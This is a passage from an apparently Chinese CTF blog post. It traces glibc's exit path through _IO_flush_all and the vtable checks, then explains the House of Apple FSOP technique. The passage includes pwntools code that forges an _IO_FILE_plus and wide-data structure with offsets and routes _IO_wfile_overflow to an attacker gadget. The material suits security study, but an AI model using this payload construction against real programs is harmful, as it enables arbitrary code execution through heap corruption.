 *listp = cur-&gt;next;      if (*listp != NULL)\t/* Don't free the last element in the chain, this is the statically\t   allocate element.  */\tfree (cur);    }  __libc_lock_unlock (__exit_funcs_lock);  if (run_list_atexit)    call_function_static_weak (_IO_cleanup);  _exit (status);}voidexit (int status){  __run_exit_handlers (status, &amp;__exit_funcs, true, true);}libc_hidden_def (exit)\n_IO_cleanup()\n在__run_exit_handlers 中调用了_IO_cleanup，它在 /libio/genops.c 中有定义:\nint_IO_cleanup (void){  int result = _IO_flush_all ();  /* We currently don't have a reliable mechanism for making sure that     C++ static destructors are executed in the correct order.     So it is possible that other static destructors might want to     write to cout - and they're supposed to be able to do so.     The following will make the standard streambufs be unbuffered,     which forces any output from late destructors to be written out. */  _IO_unbuffer_all ();  return result;}\n_IO_flush_all()\n同样在这个文件中，可以找到_IO_flush_all:\nint_IO_flush_all (void){  int result = 0;  FILE *fp;#ifdef _IO_MTSAFE_IO  _IO_cleanup_region_start_noarg (flush_cleanup);  _IO_lock_lock (list_all_lock);#endif  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)    {      run_fp = fp;      _IO_flockfile (fp);      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)       || (_IO_vtable_offset (fp) == 0           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))       )      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)    result = EOF;      _IO_funlockfile (fp);      run_fp = NULL;    }#ifdef _IO_MTSAFE_IO  _IO_lock_unlock (list_all_lock);  _IO_cleanup_region_end (0);#endif  return result;}\nvoid_cthreads_flockfile (FILE *fp){  _IO_lock_lock (*fp-&gt;_lock);}// ...void _IO_flockfile (FILE *)     __attribute__ ((alias (\"_cthreads_flockfile\")));// ...\n_IO_FILE_plus 在 /libio/stdfiles.c 有定义\n主要关注这个函数中的判断条件，如果前面的条件满足，会进入_IO_OVERFLOW (fp, EOF)，这是一个宏定义，位于 /libio/libioP.h：\n/* Type of MEMBER in struct type TYPE.  */#define _IO_MEMBER_TYPE(TYPE, MEMBER) __typeof__ (((TYPE){}).MEMBER)/* Essentially ((TYPE *) THIS)-&gt;MEMBER, but avoiding the aliasing   violation in case THIS has a different pointer type.  */#define _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \\  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \\\t\t\t\t       + offsetof(TYPE, MEMBER)))//...#define _IO_JUMPS_FILE_plus(THIS) \\  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)//...# define _IO_JUMPS_FUNC(THIS) \\  (IO_validate_vtable                                                   \\   (*(struct _IO_jump_t **) ((void  +*) &amp;_IO_JUMPS_FILE_plus (THIS)\t\\\t\t\t     + (THIS)-&gt;_vtable_offset)))\t//...#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)//...#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)//...IO_validate_vtable (const struct _IO_jump_t *vtable){  uintptr_t ptr = (uintptr_t) vtable;  uintptr_t offset = ptr - (uintptr_t) &amp;__io_vtables;  if (__glibc_unlikely (offset &gt;= IO_VTABLES_LEN))    /* The vtable pointer is not in the expected section.  Use the       slow path, which will terminate the process if necessary.  */    _IO_vtable_check ();  return vtable;}\n如果通过合法性检查，那么会执行_vtable-&gt;__overflow\n#define JUMP_FIELD(TYPE, NAME) TYPE NAME//...struct _IO_jump_t{//...    JUMP_FIELD(_IO_overflow_t, __overflow);//...}\n这里__overflow 是_IO_jump_t vtable 中的虚函数，这是 GLIBC 中实现 I/O 多态的核心机制\nvtable2\n通过虚函数表（vtable）为不同类型的文件流（如文件、内存流、字符串流）提供统一的接口，同时允许不同流类型自定义底层操作（如读、写、缓冲区管理）。\n我们可以在 /libio/vtables.c 中找到相关的定义。\nconst struct _IO_jump_t __io_vtables[] attribute_relro ={  /* _IO_str_jumps  */  [IO_STR_JUMPS] =  {\tJUMP_INIT_DUMMY,    JUMP_INIT (finish, _IO_str_finish),  //...  },  [IO_WSTR_JUMPS] = {\tJUMP_INIT_DUMMY,    JUMP_INIT (finish, _IO_wstr_finish),  //...  },  //...}\n也就是说，__overflow\n实际是执行__io_vtables 中已定义的相关函数。如 finish，会根据不同 I/O 类型执行不同函数，例如 [IO_STR_JUMPS] 中指向_IO_str-finish；[IO_WSTR_JUMPS] 中指向_IO_wstr_finish。\nIII. House of Apple\n在上一节中，我们知道在_IO_JUMPS_FUNC(THIS) 这个宏中验证了 const struct _IO_jump_t *vtable 是否是合法的：即它指向的地址是否在__io_vtables 的范围内。这也让我们不能通过直接伪造 vtable 来控制程序执行流。\n然而，我们仍有机会修改 vtable 为不同的合法虚表。这导致了后续函数执行过程中存在可利用的漏洞。\n构造_IO_FILE_plus\n使用 House of Apple 的前提是 Large bin\nattack，它将一个堆地址写在任意地址处。\n这里将 &amp;_IO_list_all 处写可控堆地址，然后开始伪造_IO_FILE_plus。\n由于 Large bin\nattack 是把堆的头部 prev_size 地址写入，而一般我们只能从 fd 域开始编辑，所以下文的伪造会从 fd 开始。\nfake_io = flat({\t0x18:[\t\tp64(1) # _IO_write_ptr [fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base]\t],\t0x60:[\t\tp32(0) # _fileno\t],\t0x78:[\t\tp64(_IO_stdfile_2_lock) # *_lock [_IO_flockfile (fp);]\t],\t0xb0:[\t\tp32(0xFFFFFFFF) # _mode [fp-&gt;_mode &lt;= 0]\t]})\n_wide_data 调用链\n尽管无法直接通过修改 vtable 控制执行流，但是_wide_data-&gt;_wide_vtable 在执行时缺少安全检查。\n因此我们可以构造如下调用链，其中涉及到的方法和宏可自行查阅：\n_IO_OVERFLOW (fp, EOF)-&gt;(_IO_overflow_t) _IO_wfile_overflow-&gt;_IO_wdoallocbuf (f)-&gt;_IO_WDOALLOCATE (fp)-&gt;Backdoor(fp) # fake vtable points at\n构造_wide_data,\n_wide_vtable\n为了使用上面的调用链，需要修改 *_wide_data 到我们伪造的_IO_wide_data。\n这里有一个巧妙的处理，我们可以将其指向之前伪造的_IO_FILE_plus 处，因为_IO_wide_data 中部分成员是与_IO_FILE 相同的。\n然后在_wide_data-&gt;_wide_vtable 处写构造的 vtable 地址。\n\n\n\nimage-20250408193602020\n\n_IO_stdfile_2_lock = libc_base + 0x205700 # find your offset in gdbIO_file_addr = heap_base + 0x0d00IO_wide_data_addr = IO_file_addrwide_vtable_addr = file_addr + 0xe8-0x68 fake_io = flat({\t0x18:[\t\tp64(1) # _IO_write_ptr [fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base]\t],\t0x60:[\t\tp32(0) # _fileno\t],\t0x78:[\t\tp64(_IO_stdfile_2_lock) # *_lock [_IO_flockfile (fp);]\t],\t0x90:[\t\tp64(IO_wide_data_addr) # *_wide_data\t],\t0xb0:[\t\tp32(0xFFFFFFFF) # _mode [fp-&gt;_mode &lt;= 0]\t],\t0xc8:[\t\tp64(libc_base+libc.sym['_IO_wfile_jumps']) # vtable\t],\t0xd0:[\t\tp64(wide_vtable_addr)\t],\t0xd8:[\t\tp64(gadget)\t]})\n这样，就控制了程序执行流，并且 $rdi = &amp;fp。\n对于 House of Apple 的实践，您也可以阅读我的这篇文章：HGAME\n2025 Week 2 Writeup\nReferences\n\n\n\n看雪：House of apple\n一种新的 glibc 中 IO 攻击方法↩︎\n看雪：Pwn 堆利用学习 ——\nFSOP、House of Orange↩︎\n\n\n","categories":["CTF"],"tags":["pwn","FSOP","House of Apple"]}]